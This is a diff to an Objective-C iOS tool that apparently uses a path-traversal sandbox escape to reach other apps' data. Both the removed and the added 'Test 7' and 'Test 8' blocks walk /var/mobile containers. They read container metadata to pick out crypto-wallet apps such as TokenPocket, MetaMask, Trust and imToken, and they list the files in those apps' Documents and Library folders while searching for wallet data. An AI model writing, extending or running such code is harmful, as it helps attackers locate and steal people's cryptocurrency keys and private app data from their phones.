@@ -9209,91 +9209,59 @@ static uint64_t rie_find_exec_base(task_t task,
                 [self appendLog:[NSString stringWithFormat:@"Test 6: / FAIL: %@ (code=%ld)",
                     fsErr.localizedDescription, (long)fsErr.code]];
             }
-            // Test 7: enumerate /var/mobile/Containers/Data/Application to find TokenPocket
-            NSString *appContainersRaw = [traversalPrefix stringByAppendingString:
-                @"var/mobile/Containers/Data/Application"];
-            NSString *appContainersResolved = [appContainersRaw stringByExpandingTildeInPath];
-            NSArray *uuidDirs = [[NSFileManager defaultManager]
-                contentsOfDirectoryAtPath:appContainersResolved error:&fsErr];
-            if (uuidDirs) {
-                [self appendLog:[NSString stringWithFormat:@"Test 7: /var/mobile/.../Application -> %lu UUID dirs",
-                    (unsigned long)uuidDirs.count]];
-                NSMutableArray *found = [NSMutableArray array];
-                for (NSString *uuid in uuidDirs) {
-                    // Skip our own container
-                    if ([uuid hasPrefix:@"E95C885E"] || [uuid hasPrefix:@"307C4174"] ||
-                        [uuid hasPrefix:@"1E0CBBDC"]) continue;
-                    NSString *metaPath = [NSString stringWithFormat:@"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
-                        appContainersResolved, uuid];
-                    NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
-                    NSString *bundleID = meta[@"MCMMetadataIdentifier"];
-                    if (bundleID) {
-                        // Check for wallet/crypto apps
-                        NSString *lower = [bundleID lowercaseString];
-                        if ([lower containsString:@"token"] || [lower containsString:@"wallet"] ||
-                            [lower containsString:@"tp"] || [lower containsString:@"tron"] ||
-                            [lower containsString:@"crypto"] || [lower containsString:@"trust"] ||
-                            [lower containsString:@"metamask"] || [lower containsString:@"imtoken"]) {
-                            [found addObject:[NSString stringWithFormat:@"%@ -> %@", uuid, bundleID]];
-                            // List contents of this container
-                            NSString *containerPath = [appContainersResolved stringByAppendingPathComponent:uuid];
-                            NSArray *contents = [[NSFileManager defaultManager]
-                                contentsOfDirectoryAtPath:containerPath error:nil];
-                            [self appendLog:[NSString stringWithFormat:@"  %@ = %@ (%lu items): %@",
-                                uuid, bundleID, (unsigned long)contents.count,
-                                [contents componentsJoinedByString:@", "]]];
-                        } else {
-                            // Track all for count
-                            [found addObject:uuid];
-                        }
-                    }
-                    if (found.count >= 200) break; // safety limit
+            // Test 7: step-by-step path walk to find permission boundary
+            [self appendLog:@"Test 7: step-by-step path walk —"];
+            NSArray *steps = @[
+                @"var",
+                @"var/mobile",
+                @"var/mobile/Containers",
+                @"var/mobile/Containers/Data",
+                @"var/mobile/Containers/Data/Application",
+            ];
+            BOOL walkOK = YES;
+            for (NSString *step in steps) {
+                if (!walkOK) break;
+                NSString *raw = [traversalPrefix stringByAppendingString:step];
+                NSString *resolved = [raw stringByExpandingTildeInPath];
+                NSError *e = nil;
+                NSArray *entries = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:resolved error:&e];
+                if (entries) {
+                    [self appendLog:[NSString stringWithFormat:@"  /%@ -> %lu entries OK", step, (unsigned long)entries.count]];
+                } else {
+                    [self appendLog:[NSString stringWithFormat:@"  /%@ -> BLOCKED: %@ (code=%ld)", step, e.localizedDescription, (long)e.code]];
+                    walkOK = NO;
+                    // Try individual metadata plist to find wallet UUIDs
+                    [self appendLog:@"  trying individual metadata plist read..."];
+                    NSString *metaPath = [resolved stringByAppendingPathComponent:
+                        @".com.apple.mobile_container_manager.metadata.plist"];
+                    BOOL metaExists = [[NSFileManager defaultManager] fileExistsAtPath:metaPath];
+                    [self appendLog:[NSString stringWithFormat:@"  metadata plist exists: %d", metaExists]];
                 }
-                [self appendLog:[NSString stringWithFormat:@"  scanned %lu dirs, found %lu wallet-related",
-                    (unsigned long)uuidDirs.count, (unsigned long)found.count]];
-            } else {
-                [self appendLog:[NSString stringWithFormat:@"Test 7: FAIL: %@ (code=%ld)",
-                    fsErr.localizedDescription, (long)fsErr.code]];
             }
 
-            // Test 8: deep scan — walk into matching containers for DB/key files
-            {
-                NSArray *keywords = @[@"tokenpocket", @"tp", @"tron", @"wallet", @"trust", @"metamask", @"imtoken"];
-                for (NSString *uuid in uuidDirs) {
-                    NSString *metaPath = [NSString stringWithFormat:@"%@/%@/.com.apple.mobile_container_manager.metadata.plist",
-                        appContainersResolved, uuid];
-                    NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
-                    NSString *bid = [meta[@"MCMMetadataIdentifier"] lowercaseString];
-                    if (!bid) continue;
-                    BOOL match = NO;
-                    for (NSString *kw in keywords) {
-                        if ([bid containsString:kw]) { match = YES; break; }
+            // Test 8: alternative — search for TokenPocket via known paths
+            [self appendLog:@"\nTest 8: alternative path search for wallet data —"];
+            NSArray *altPaths = @[
+                @"var/mobile/Library",
+                @"var/mobile/Library/Caches",
+                @"var/mobile/Library/Preferences",
+                @"var/mobile/Documents",
+                @"var/containers/Shared",
+                @"var/mobile/Containers/Shared",
+                @"var/mobile/Containers/Data",
+            ];
+            for (NSString *ap in altPaths) {
+                NSString *raw = [traversalPrefix stringByAppendingString:ap];
+                NSString *resolved = [raw stringByExpandingTildeInPath];
+                NSError *e = nil;
+                NSArray *entries = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:resolved error:&e];
+                if (entries) {
+                    [self appendLog:[NSString stringWithFormat:@"  /%@: %lu entries", ap, (unsigned long)entries.count]];
+                    if (entries.count < 30 && entries.count > 0) {
+                        [self appendLog:[NSString stringWithFormat:@"    contents: %@", [entries componentsJoinedByString:@", "]]];
                     }
-                    if (!match) continue;
-
-                    [self appendLog:[NSString stringWithFormat:@"\n=== %@ (%@) ===", uuid, bid]];
-                    NSString *base = [appContainersResolved stringByAppendingPathComponent:uuid];
-                    // Recurse one level into Documents, Library, tmp
-                    for (NSString *sub in @[@"Documents", @"Library", @"tmp"]) {
-                        NSString *subPath = [base stringByAppendingPathComponent:sub];
-                        NSArray *entries = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:subPath error:nil];
-                        if (!entries) continue;
-                        [self appendLog:[NSString stringWithFormat:@"  %@ (%lu): %@", sub,
-                            (unsigned long)entries.count,
-                            [[entries subarrayWithRange:NSMakeRange(0, MIN(30, entries.count))]
-                                componentsJoinedByString:@", "]]];
-                        // Recurse one more level for Library
-                        if ([sub isEqualToString:@"Library"]) {
-                            for (NSString *e in entries) {
-                                NSString *ePath = [subPath stringByAppendingPathComponent:e];
-                                NSArray *sub2 = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:ePath error:nil];
-                                if (sub2.count > 0 && sub2.count < 50) {
-                                    [self appendLog:[NSString stringWithFormat:@"    Library/%@: %@",
-                                        e, [sub2 componentsJoinedByString:@", "]]];
-                                }
-                            }
-                        }
-                    }
+                } else {
+                    [self appendLog:[NSString stringWithFormat:@"  /%@: BLOCKED (%ld)", ap, (long)e.code]];
                 }
             }
         }
